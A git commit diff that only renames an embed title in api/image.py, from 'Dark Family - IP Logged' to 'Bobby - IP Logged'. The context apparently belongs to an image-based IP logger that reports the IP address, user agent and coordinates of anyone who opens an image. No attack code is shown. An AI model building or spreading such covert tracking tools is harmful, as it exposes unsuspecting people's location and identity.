323c57bbd92a40007bff5b1c744ccc778820c3f7
JUJUFROMHELL <141362938+JUJUFROMHELL@users.noreply.github.com>
2025-06-07 01:07:03 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -127,7 +127,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Dark Family - IP Logged",
+            "title": "Bobby - IP Logged",
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
 
